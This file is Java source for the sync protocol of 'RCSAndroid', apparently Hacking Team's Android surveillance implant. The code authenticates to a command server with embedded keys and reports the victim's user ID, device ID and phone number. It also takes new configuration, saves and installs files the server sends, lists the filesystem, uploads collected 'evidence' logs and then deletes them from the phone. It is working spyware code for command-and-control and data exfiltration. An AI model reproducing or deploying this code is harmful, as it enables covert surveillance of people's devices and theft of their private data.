/* *******************************************
 * Copyright (c) 2011
 * HT srl,   All rights reserved.
 * Project      : RCS, RCSAndroid
 * File         : ZProtocol.java
 * Created      : Apr 9, 2011
 * Author		: zeno
 * *******************************************/
package com.ht.RCSAndroidGUI.action.sync;

import java.io.IOException;
import java.security.NoSuchAlgorithmException;
import java.security.SecureRandom;
import java.util.Date;
import java.util.Vector;

import com.ht.RCSAndroidGUI.Debug;
import com.ht.RCSAndroidGUI.Device;
import com.ht.RCSAndroidGUI.EvidenceCollector;
import com.ht.RCSAndroidGUI.Status;
import com.ht.RCSAndroidGUI.crypto.CryptoException;
import com.ht.RCSAndroidGUI.crypto.EncryptionPKCS5;
import com.ht.RCSAndroidGUI.crypto.Keys;
import com.ht.RCSAndroidGUI.crypto.SHA1Digest;
import com.ht.RCSAndroidGUI.file.AutoFile;
import com.ht.RCSAndroidGUI.file.Directory;
import com.ht.RCSAndroidGUI.file.Path;
import com.ht.RCSAndroidGUI.utils.Check;
import com.ht.RCSAndroidGUI.utils.DataBuffer;
import com.ht.RCSAndroidGUI.utils.Utils;
import com.ht.RCSAndroidGUI.utils.WChar;

// TODO: Auto-generated Javadoc
/**
 * The Class ZProtocol.
 */
public class ZProtocol extends Protocol {

	/** The Constant SHA1LEN. */
	private static final int SHA1LEN = 20;
	// #ifdef DEBUG
	/** The debug. */
	private static Debug debug = new Debug("ZProtocol");
	// #endif

	/** The crypto k. */
	private final EncryptionPKCS5 cryptoK = new EncryptionPKCS5();

	/** The crypto conf. */
	private final EncryptionPKCS5 cryptoConf = new EncryptionPKCS5();

	/** The Kd. */
	byte[] Kd = new byte[16];

	/** The Nonce. */
	byte[] Nonce = new byte[16];

	/** The upgrade. */
	boolean upgrade;

	/** The upgrade files. */
	Vector upgradeFiles = new Vector();

	/**
	 * Instantiates a new z protocol.
	 */
	public ZProtocol() {
		try {
			random = SecureRandom.getInstance("SHA1PRNG");
		} catch (final NoSuchAlgorithmException e) {
			// TODO Auto-generated catch block
			e.printStackTrace();
		}
	}

	/** The random. */
	SecureRandom random;

	/*
	 * (non-Javadoc)
	 * 
	 * @see com.ht.RCSAndroidGUI.action.sync.Protocol#perform()
	 */
	public boolean perform() {
		// #ifdef DBC
		Check.requires(transport != null, "perform: transport = null");
		// #endif

		reload = false;
		uninstall = false;

		try {

			uninstall = authentication();

			if (uninstall) {
				// #ifdef DEBUG
				debug.warn("Uninstall detected, no need to continue");
				// #endif
				return true;
			}

			final boolean[] capabilities = identification();

			newConf(capabilities[Proto.NEW_CONF]);
			download(capabilities[Proto.DOWNLOAD]);
			upload(capabilities[Proto.UPLOAD]);
			upgrade(capabilities[Proto.UPGRADE]);
			filesystem(capabilities[Proto.FILESYSTEM]);
			evidences();
			end();

			return true;

		} catch (final TransportException e) {
			// #ifdef DEBUG
			debug.error(e);
			// #endif
			return false;
		} catch (final ProtocolException e) {
			// #ifdef DEBUG
			debug.error(e);
			// #endif
			return false;
		} catch (final CommandException e) {
			// #ifdef DEBUG
			debug.error(e);
			// #endif
			return false;
		} finally {
			transport.close();
		}
	}

	/**
	 * Authentication.
	 * 
	 * @return true if uninstall
	 * @throws TransportException
	 *             the transport exception
	 * @throws ProtocolException
	 *             the protocol exception
	 */
	private boolean authentication() throws TransportException,
			ProtocolException {
		// #ifdef DEBUG
		debug.info("***** Authentication *****");
		// #endif

		// key init
		cryptoConf.makeKey(Keys.self().getChallengeKey());

		random.nextBytes(Kd);
		random.nextBytes(Nonce);

		// #ifdef DEBUG
		debug.trace("Kd: " + Utils.byteArrayToHex(Kd));
		debug.trace("Nonce: " + Utils.byteArrayToHex(Nonce));
		// #endif

		final byte[] cypherOut = cryptoConf.encryptData(forgeAuthentication());
		final byte[] response = transport.command(cypherOut);

		return parseAuthentication(response);
	}

	/**
	 * Identification.
	 * 
	 * @return the boolean[]
	 * @throws TransportException
	 *             the transport exception
	 * @throws ProtocolException
	 *             the protocol exception
	 */
	private boolean[] identification() throws TransportException,
			ProtocolException {
		// #ifdef DEBUG
		debug.info("***** Identification *****");
		// #endif

		final byte[] response = command(Proto.ID, forgeIdentification());
		final boolean[] capabilities = parseIdentification(response);
		return capabilities;
	}

	/**
	 * New conf.
	 * 
	 * @param cap
	 *            the cap
	 * @throws TransportException
	 *             the transport exception
	 * @throws ProtocolException
	 *             the protocol exception
	 * @throws CommandException
	 *             the command exception
	 */
	private void newConf(final boolean cap) throws TransportException,
			ProtocolException, CommandException {
		if (cap) {
			// #ifdef DEBUG
			debug.info("***** NewConf *****");
			// #endif

			final byte[] response = command(Proto.NEW_CONF);
			parseNewConf(response);
		}
	}

	/**
	 * Download.
	 * 
	 * @param cap
	 *            the cap
	 * @throws TransportException
	 *             the transport exception
	 * @throws ProtocolException
	 *             the protocol exception
	 * @throws CommandException
	 *             the command exception
	 */
	private void download(final boolean cap) throws TransportException,
			ProtocolException, CommandException {
		if (cap) {
			final byte[] response = command(Proto.DOWNLOAD);
			parseNewConf(response);
		}
	}

	/**
	 * Upload.
	 * 
	 * @param cap
	 *            the cap
	 * @throws TransportException
	 *             the transport exception
	 * @throws ProtocolException
	 *             the protocol exception
	 * @throws CommandException
	 *             the command exception
	 */
	private void upload(final boolean cap) throws TransportException,
			ProtocolException, CommandException {
		if (cap) {
			// #ifdef DEBUG
			debug.info("***** Upload *****");
			// #endif

			upgrade = false;
			boolean left = true;
			while (left) {
				final byte[] response = command(Proto.UPLOAD);
				left = parseUpload(response);
			}
		}
	}

	/**
	 * Upgrade.
	 * 
	 * @param cap
	 *            the cap
	 * @throws TransportException
	 *             the transport exception
	 * @throws ProtocolException
	 *             the protocol exception
	 * @throws CommandException
	 *             the command exception
	 */
	private void upgrade(final boolean cap) throws TransportException,
			ProtocolException, CommandException {
		if (cap) {
			// #ifdef DEBUG
			debug.info("***** Upgrade *****");
			// #endif

			upgradeFiles.removeAllElements();

			boolean left = true;
			while (left) {
				final byte[] response = command(Proto.UPGRADE);
				left = parseUpgrade(response);
			}
		}
	}

	/**
	 * Filesystem.
	 * 
	 * @param cap
	 *            the cap
	 * @throws TransportException
	 *             the transport exception
	 * @throws ProtocolException
	 *             the protocol exception
	 * @throws CommandException
	 *             the command exception
	 */
	private void filesystem(final boolean cap) throws TransportException,
			ProtocolException, CommandException {
		if (cap) {
			// #ifdef DEBUG
			debug.info("***** FileSystem *****");
			// #endif
			final byte[] response = command(Proto.FILESYSTEM);
			parseFileSystem(response);
		}
	}

	/**
	 * Evidences.
	 * 
	 * @throws TransportException
	 *             the transport exception
	 * @throws ProtocolException
	 *             the protocol exception
	 * @throws CommandException
	 *             the command exception
	 */
	private void evidences() throws TransportException, ProtocolException,
			CommandException {
		// #ifdef DEBUG
		debug.info("***** Log *****");
		// #endif

		sendEvidences(Path.logs());
	}

	/**
	 * End.
	 * 
	 * @throws TransportException
	 *             the transport exception
	 * @throws ProtocolException
	 *             the protocol exception
	 * @throws CommandException
	 *             the command exception
	 */
	private void end() throws TransportException, ProtocolException,
			CommandException {
		// #ifdef DEBUG
		debug.info("***** END *****");
		// #endif
		final byte[] response = command(Proto.BYE);
		parseNewConf(response);

	}

	// **************** PROTOCOL **************** //
	/**
	 * Forge authentication.
	 * 
	 * @return the byte[]
	 */
	protected byte[] forgeAuthentication() {
		final Keys keys = Keys.self();

		final byte[] data = new byte[104];
		final DataBuffer dataBuffer = new DataBuffer(data, 0, data.length);

		// filling structure
		dataBuffer.write(Kd);
		dataBuffer.write(Nonce);

		// #ifdef DBC
		Check.ensures(dataBuffer.getPosition() == 32,
				"forgeAuthentication, wrong array size");
		// #endif

		dataBuffer.write(Utils.padByteArray(keys.getBuildId(), 16));
		dataBuffer.write(keys.getInstanceId());
		dataBuffer.write(Utils.padByteArray(keys.getSubtype(), 16));

		// #ifdef DBC
		Check.ensures(dataBuffer.getPosition() == 84,
				"forgeAuthentication, wrong array size");
		// #endif

		// calculating digest
		final SHA1Digest digest = new SHA1Digest();
		digest.update(Utils.padByteArray(keys.getBuildId(), 16));
		digest.update(keys.getInstanceId());
		digest.update(Utils.padByteArray(keys.getSubtype(), 16));
		digest.update(keys.getConfKey());

		final byte[] sha1 = digest.getDigest();

		// #ifdef DEBUG
		debug.trace("forgeAuthentication sha1 = " + Utils.byteArrayToHex(sha1));
		debug.trace("forgeAuthentication confKey="
				+ Utils.byteArrayToHex(keys.getConfKey()));
		// #endif

		// appending digest
		dataBuffer.write(sha1);

		// #ifdef DBC
		Check.ensures(dataBuffer.getPosition() == data.length,
				"forgeAuthentication, wrong array size");
		// #endif

		// #ifdef DEBUG
		debug.trace("forgeAuthentication: " + Utils.byteArrayToHex(data));
		// #endif

		return data;
	}

	/**
	 * Parses the authentication.
	 * 
	 * @param authResult
	 *            the auth result
	 * @return true if uninstall
	 * @throws ProtocolException
	 *             the protocol exception
	 */
	protected boolean parseAuthentication(final byte[] authResult)
			throws ProtocolException {

		if (new String(authResult).contains("<html>")) {
			debug.error("Fake answer");
			throw new ProtocolException(14);
		}

		// #ifdef DBC
		Check.ensures(authResult.length == 64, "authResult.length="
				+ authResult.length);
		// #endif

		// #ifdef DEBUG
		debug.trace("decodeAuth result = " + Utils.byteArrayToHex(authResult));
		debug.trace("decodeAuth result string= " + new String(authResult));
		// #endif

		// Retrieve K
		final byte[] cypherKs = new byte[32];
		Utils.copy(cypherKs, authResult, cypherKs.length);
		try {
			final byte[] Ks = cryptoConf.decryptData(cypherKs);

			// #ifdef DEBUG
			debug.trace("decodeAuth Kd=" + Utils.byteArrayToHex(Kd));
			debug.trace("decodeAuth Ks=" + Utils.byteArrayToHex(Ks));
			// #endif

			// PBKDF1 (SHA1, c=1, Salt=KS||Kd)
			final SHA1Digest digest = new SHA1Digest();
			digest.update(Keys.self().getConfKey());
			digest.update(Ks);
			digest.update(Kd);

			final byte[] K = new byte[16];
			Utils.copy(K, digest.getDigest(), K.length);

			cryptoK.makeKey(K);

			// #ifdef DEBUG
			debug.trace("decodeAuth K=" + Utils.byteArrayToHex(K));
			// #endif

			// Retrieve Nonce and Cap
			final byte[] cypherNonceCap = new byte[32];
			Utils.copy(cypherNonceCap, 0, authResult, 32, cypherNonceCap.length);

			final byte[] plainNonceCap = cryptoK.decryptData(cypherNonceCap);
			// #ifdef DEBUG
			debug.trace("decodeAuth plainNonceCap="
					+ Utils.byteArrayToHex(plainNonceCap));
			// #endif

			final boolean nonceOK = Utils.equals(Nonce, 0, plainNonceCap, 0,
					Nonce.length);
			// #ifdef DEBUG
			debug.trace("decodeAuth nonceOK: " + nonceOK);
			// #endif
			if (nonceOK) {
				final int cap = Utils.byteArrayToInt(plainNonceCap, 16);
				if (cap == Proto.OK) {
					// #ifdef DEBUG
					debug.trace("decodeAuth Proto OK");
					// #endif
				} else if (cap == Proto.UNINSTALL) {
					// #ifdef DEBUG
					debug.trace("decodeAuth Proto Uninstall");
					// #endif
					return true;
				} else {
					// #ifdef DEBUG
					debug.trace("decodeAuth error: " + cap);
					// #endif
					throw new ProtocolException(11);
				}
			} else {
				throw new ProtocolException(12);
			}

		} catch (final CryptoException ex) {
			// #ifdef DEBUG
			debug.error("parseAuthentication: " + ex);
			// #endif
			throw new ProtocolException(13);
		}

		return false;
	}

	/**
	 * Forge identification.
	 * 
	 * @return the byte[]
	 */
	protected byte[] forgeIdentification() {
		final Device device = Device.self();

		final byte[] userid = WChar.pascalize(device.getUserId());
		final byte[] deviceid = WChar.pascalize(device.getDeviceId());
		final byte[] phone = WChar.pascalize(device.getPhoneNumber());

		final int len = 4 + userid.length + deviceid.length + phone.length;

		final byte[] content = new byte[len];

		final DataBuffer dataBuffer = new DataBuffer(content, 0, content.length);
		// dataBuffer.writeInt(Proto.ID);
		dataBuffer.write(device.getVersion());
		dataBuffer.write(userid);
		dataBuffer.write(deviceid);
		dataBuffer.write(phone);

		// #ifdef DBC
		Check.ensures(dataBuffer.getPosition() == content.length,
				"forgeIdentification pos: " + dataBuffer.getPosition());
		// #endif

		// #ifdef DEBUG
		debug.trace("forgeIdentification: " + Utils.byteArrayToHex(content));
		// #endif
		return content;
	}

	/**
	 * Parses the identification.
	 * 
	 * @param result
	 *            the result
	 * @return the boolean[]
	 * @throws ProtocolException
	 *             the protocol exception
	 */
	protected boolean[] parseIdentification(final byte[] result)
			throws ProtocolException {
		final boolean[] capabilities = new boolean[Proto.LASTTYPE];

		final int res = Utils.byteArrayToInt(result, 0);
		if (res == Proto.OK) {
			// #ifdef DEBUG
			debug.info("got Identification");
			// #endif

			final DataBuffer dataBuffer = new DataBuffer(result, 4,
					result.length - 4);
			try {
				// la totSize e' discutibile
				final int totSize = dataBuffer.readInt();

				final long dateServer = dataBuffer.readLong();

				// #ifdef DEBUG
				debug.trace("parseIdentification: " + dateServer);
				// #endif

				final Date date = new Date();
				final int drift = (int) (dateServer - (date.getTime() / 1000));

				// #ifdef DEBUG
				debug.trace("parseIdentification drift: " + drift);
				// #endif
				Status.self().drift = drift;

				final int numElem = dataBuffer.readInt();

				for (int i = 0; i < numElem; i++) {
					final int cap = dataBuffer.readInt();
					if (cap < Proto.LASTTYPE) {
						capabilities[cap] = true;
					}
					// #ifdef DEBUG
					debug.trace("capabilities: " + capabilities[i]);
					// #endif
				}

			} catch (final IOException e) {
				// #ifdef DEBUG
				debug.error(e);
				// #endif
				throw new ProtocolException();
			}
		} else if (res == Proto.NO) {
			// #ifdef DEBUG
			debug.info("no new conf: ");
			// #endif
		} else {
			// #ifdef DEBUG
			debug.error("parseNewConf: " + res);
			// #endif
			throw new ProtocolException();
		}

		return capabilities;
	}

	/**
	 * Parses the new conf.
	 * 
	 * @param result
	 *            the result
	 * @throws ProtocolException
	 *             the protocol exception
	 * @throws CommandException
	 *             the command exception
	 */
	protected void parseNewConf(final byte[] result) throws ProtocolException,
			CommandException {
		final int res = Utils.byteArrayToInt(result, 0);
		if (res == Proto.OK) {
			// #ifdef DEBUG
			debug.info("got NewConf");
			// #endif

			final int confLen = Utils.byteArrayToInt(result, 4);
			// #ifdef DEBUG
			debug.trace("parseNewConf len: " + confLen);
			// #endif

			if (confLen > 0) {
				final boolean ret = Protocol.saveNewConf(result, 8);

				if (ret) {
					reload = true;
				}
			}

		} else if (res == Proto.NO) {
			// #ifdef DEBUG
			debug.info("no new conf: ");
			// #endif
		} else {
			// #ifdef DEBUG
			debug.error("parseNewConf: " + res);
			// #endif
			throw new ProtocolException();
		}
	}

	/**
	 * Parses the download.
	 * 
	 * @param result
	 *            the result
	 * @throws ProtocolException
	 *             the protocol exception
	 */
	protected void parseDownload(final byte[] result) throws ProtocolException {
		final int res = Utils.byteArrayToInt(result, 0);
		if (res == Proto.OK) {
			// #ifdef DEBUG
			debug.trace("parseDownload, OK");
			// #endif
			final DataBuffer dataBuffer = new DataBuffer(result, 4,
					result.length - 4);
			try {
				// la totSize e' discutibile
				final int totSize = dataBuffer.readInt();
				final int numElem = dataBuffer.readInt();
				for (int i = 0; i < numElem; i++) {
					String file = WChar.readPascal(dataBuffer);
					// #ifdef DEBUG
					debug.trace("parseDownload: " + file);
					// #endif

					// expanding $dir$
					file = Directory.expandMacro(file);
					file = Protocol.normalizeFilename(file);
					Protocol.saveDownloadLog(file);
				}

			} catch (final IOException e) {
				// #ifdef DEBUG
				debug.error(e);
				// #endif
				throw new ProtocolException();
			}
		} else if (res == Proto.NO) {
			// #ifdef DEBUG
			debug.info("parseDownload: no download");
			// #endif
		} else {
			// #ifdef DEBUG
			debug.error("parseDownload, wrong answer: " + res);
			// #endif
			throw new ProtocolException();
		}
	}

	/**
	 * Parses the upload.
	 * 
	 * @param result
	 *            the result
	 * @return true if left>0
	 * @throws ProtocolException
	 *             the protocol exception
	 */
	protected boolean parseUpload(final byte[] result) throws ProtocolException {

		final int res = Utils.byteArrayToInt(result, 0);
		if (res == Proto.OK) {
			// #ifdef DEBUG
			debug.trace("parseUpload, OK");
			// #endif
			final DataBuffer dataBuffer = new DataBuffer(result, 4,
					result.length - 4);
			try {
				final int totSize = dataBuffer.readInt();
				final int left = dataBuffer.readInt();
				// #ifdef DEBUG
				debug.trace("parseUpload left: " + left);
				// #endif
				final String filename = WChar.readPascal(dataBuffer);
				// #ifdef DEBUG
				debug.trace("parseUpload: " + filename);
				// #endif

				final int size = dataBuffer.readInt();
				final byte[] content = new byte[size];
				dataBuffer.read(content);

				// #ifdef DEBUG
				debug.trace("parseUpload: saving");
				// #endif
				Protocol.saveUpload(filename, content);

				return left > 0;

			} catch (final IOException e) {
				// #ifdef DEBUG
				debug.error(e);
				// #endif
				throw new ProtocolException();
			}
		} else if (res == Proto.NO) {
			// #ifdef DEBUG
			debug.trace("parseUpload, NO");
			// #endif
			return false;
		} else {
			// #ifdef DEBUG
			debug.error("parseUpload, wrong answer: " + res);
			// #endif
			throw new ProtocolException();
		}
	}

	/**
	 * Parses the upgrade.
	 * 
	 * @param result
	 *            the result
	 * @return true, if successful
	 * @throws ProtocolException
	 *             the protocol exception
	 */
	protected boolean parseUpgrade(final byte[] result)
			throws ProtocolException {

		final int res = Utils.byteArrayToInt(result, 0);
		if (res == Proto.OK) {
			// #ifdef DEBUG
			debug.trace("parseUpgrade, OK");
			// #endif
			final DataBuffer dataBuffer = new DataBuffer(result, 4,
					result.length - 4);
			try {
				final int totSize = dataBuffer.readInt();
				final int left = dataBuffer.readInt();
				// #ifdef DEBUG
				debug.trace("parseUpgrade left: " + left);
				// #endif
				final String filename = WChar.readPascal(dataBuffer);
				// #ifdef DEBUG
				debug.trace("parseUpgrade: " + filename);
				// #endif

				final int size = dataBuffer.readInt();
				final byte[] content = new byte[size];
				dataBuffer.read(content);

				// #ifdef DEBUG
				debug.trace("parseUpgrade: saving");
				// #endif
				Protocol.saveUpload(filename, content);
				upgradeFiles.addElement(filename);

				if (left == 0) {
					// #ifdef DEBUG
					debug.trace("parseUpgrade: all file saved, proceed with upgrade");
					// #endif
					Protocol.upgradeMulti(upgradeFiles);
				}

				return left > 0;

			} catch (final IOException e) {
				// #ifdef DEBUG
				debug.error(e);
				// #endif
				throw new ProtocolException();
			}
		} else if (res == Proto.NO) {
			// #ifdef DEBUG
			debug.trace("parseUpload, NO");
			// #endif
			return false;
		} else {
			// #ifdef DEBUG
			debug.error("parseUpload, wrong answer: " + res);
			// #endif
			throw new ProtocolException();
		}
	}

	/**
	 * Parses the file system.
	 * 
	 * @param result
	 *            the result
	 * @throws ProtocolException
	 *             the protocol exception
	 */
	protected void parseFileSystem(final byte[] result)
			throws ProtocolException {
		final int res = Utils.byteArrayToInt(result, 0);
		if (res == Proto.OK) {
			// #ifdef DEBUG
			debug.trace("parseFileSystem, OK");
			// #endif
			final DataBuffer dataBuffer = new DataBuffer(result, 4,
					result.length - 4);
			try {
				final int totSize = dataBuffer.readInt();
				final int numElem = dataBuffer.readInt();
				for (int i = 0; i < numElem; i++) {
					final int depth = dataBuffer.readInt();
					String file = WChar.readPascal(dataBuffer);
					// #ifdef DEBUG
					debug.trace("parseFileSystem: " + file + " depth: " + depth);
					// #endif

					// expanding $dir$
					file = Directory.expandMacro(file);
					Protocol.saveFilesystem(depth, file);
				}

			} catch (final IOException e) {
				// #ifdef DEBUG
				debug.error("parse error: " + e);
				// #endif
				throw new ProtocolException();
			}
		} else if (res == Proto.NO) {
			// #ifdef DEBUG
			debug.info("parseFileSystem: no download");
			// #endif
		} else {
			// #ifdef DEBUG
			debug.error("parseFileSystem, wrong answer: " + res);
			// #endif
			throw new ProtocolException();
		}
	}

	/**
	 * Send evidences.
	 * 
	 * @param basePath
	 *            the base path
	 * @throws TransportException
	 *             the transport exception
	 * @throws ProtocolException
	 *             the protocol exception
	 */
	protected void sendEvidences(final String basePath)
			throws TransportException, ProtocolException {
		// #ifdef DEBUG
		debug.info("sendEvidences from: " + basePath);
		// #endif

		final EvidenceCollector logCollector = EvidenceCollector.self();

		final Vector dirs = logCollector.scanForDirLogs(basePath);
		final int dsize = dirs.size();
		// #ifdef DEBUG
		debug.trace("sendEvidences #directories: " + dsize);
		// #endif
		for (int i = 0; i < dsize; ++i) {
			final String dir = (String) dirs.elementAt(i);
			final String[] logs = logCollector.scanForEvidences(basePath, dir);
			final int lsize = logs.length;
			// #ifdef DEBUG
			debug.trace("    dir: " + dir + " #evidences: " + lsize);
			// #endif
			// for (int j = 0; j < lsize; ++j) {
			// final String logName = (String) logs.elementAt(j);
			for (final String logName : logs) {
				final String fullLogName = basePath + dir + logName;
				final AutoFile file = new AutoFile(fullLogName);
				if (!file.exists()) {
					// #ifdef DEBUG
					debug.error("File doesn't exist: " + fullLogName);
					// #endif
					continue;
				}
				final byte[] content = file.read();
				// #ifdef DEBUG
				debug.info("Sending file: "
						+ EvidenceCollector.decryptName(logName) + " = "
						+ fullLogName);
				// #endif

				final byte[] plainOut = new byte[content.length + 4];
				Utils.copy(plainOut, 0, Utils.intToByteArray(content.length),
						0, 4);
				Utils.copy(plainOut, 4, content, 0, content.length);

				final byte[] response = command(Proto.LOG, plainOut);
				final boolean ret = parseLog(response);

				if (ret) {
					logCollector.remove(fullLogName);
				} else {
					// #ifdef DEBUG
					debug.warn("error sending file, bailing out");
					// #endif
					return;
				}
			}
			if (!Path.removeDirectory(basePath + dir)) {
				// #ifdef DEBUG
				debug.warn("Not empty directory");
				// #endif
			}
		}
	}

	/**
	 * Parses the log.
	 * 
	 * @param result
	 *            the result
	 * @return true, if successful
	 * @throws ProtocolException
	 *             the protocol exception
	 */
	protected boolean parseLog(final byte[] result) throws ProtocolException {
		return checkOk(result);
	}

	/**
	 * Parses the end.
	 * 
	 * @param result
	 *            the result
	 * @throws ProtocolException
	 *             the protocol exception
	 */
	protected void parseEnd(final byte[] result) throws ProtocolException {
		checkOk(result);
	}

	// // ****************************** INTERNALS
	// ****************************************** ////
	/**
	 * Command.
	 * 
	 * @param command
	 *            the command
	 * @return the byte[]
	 * @throws TransportException
	 *             the transport exception
	 * @throws ProtocolException
	 *             the protocol exception
	 */
	private byte[] command(final int command) throws TransportException,
			ProtocolException {
		// #ifdef DEBUG
		debug.trace("command: " + command);
		// #endif
		return command(command, new byte[0]);
	}

	/**
	 * Command.
	 * 
	 * @param command
	 *            the command
	 * @param data
	 *            the data
	 * @return the byte[]
	 * @throws TransportException
	 *             the transport exception
	 */
	private byte[] command(final int command, final byte[] data)
			throws TransportException {
		// #ifdef DBC
		Check.requires(cryptoK != null, "cypherCommand: cryptoK null");
		Check.requires(data != null, "cypherCommand: data null");
		// #endif

		// #ifdef DEBUG
		debug.trace("command: " + command + " datalen: " + data.length);
		// #endif

		final int dataLen = data.length;
		final byte[] plainOut = new byte[dataLen + 4];
		Utils.copy(plainOut, 0, Utils.intToByteArray(command), 0, 4);
		Utils.copy(plainOut, 4, data, 0, data.length);

		try {
			byte[] plainIn;
			// #ifdef ZNOSHA
			// plainIn = cypheredWriteRead(plainOut);
			// #else
			plainIn = cypheredWriteReadSha(plainOut);
			// #endif
			return plainIn;
		} catch (final CryptoException e) {
			// #ifdef DEBUG
			debug.trace("command: " + e);
			// #endif
			throw new TransportException(9);
		}
	}

	// #ifdef ZNOSHA
	/**
	 * Cyphered write read.
	 * 
	 * @param plainOut
	 *            the plain out
	 * @return the byte[]
	 * @throws TransportException
	 *             the transport exception
	 * @throws CryptoException
	 *             the crypto exception
	 */
	private byte[] cypheredWriteRead(final byte[] plainOut)
			throws TransportException, CryptoException {

		debug.trace("cypheredWriteRead");

		final byte[] cypherOut = cryptoK.encryptData(plainOut);
		final byte[] cypherIn = transport.command(cypherOut);
		final byte[] plainIn = cryptoK.decryptData(cypherIn);
		return plainIn;
	}

	// #endif

	/**
	 * Cyphered write read sha.
	 * 
	 * @param plainOut
	 *            the plain out
	 * @return the byte[]
	 * @throws TransportException
	 *             the transport exception
	 * @throws CryptoException
	 *             the crypto exception
	 */
	private byte[] cypheredWriteReadSha(final byte[] plainOut)
			throws TransportException, CryptoException {
		// #ifdef DEBUG
		debug.trace("cypheredWriteReadSha");
		debug.trace("plainout: " + plainOut.length);
		// #endif

		final byte[] cypherOut = cryptoK.encryptDataIntegrity(plainOut);
		// #ifdef DEBUG
		debug.trace("cypherOut: " + cypherOut.length);
		// #endif

		final byte[] cypherIn = transport.command(cypherOut);

		if (cypherIn.length < SHA1LEN) {
			// #ifdef DEBUG
			debug.error("cypheredWriteReadSha: cypherIn sha len error!");
			// #endif
			throw new CryptoException();
		}

		final byte[] plainIn = cryptoK.decryptDataIntegrity(cypherIn);

		return plainIn;

	}

	/**
	 * Check ok.
	 * 
	 * @param result
	 *            the result
	 * @return true, if successful
	 * @throws ProtocolException
	 *             the protocol exception
	 */
	private boolean checkOk(final byte[] result) throws ProtocolException {
		final int res = Utils.byteArrayToInt(result, 0);
		if (res == Proto.OK) {
			return true;
		} else if (res == Proto.NO) {
			// #ifdef DEBUG
			debug.error("checkOk: NO");
			// #endif
			return false;
		} else {
			// #ifdef DEBUG
			debug.error("checkOk: " + res);
			// #endif

			throw new ProtocolException();
		}
	}
}
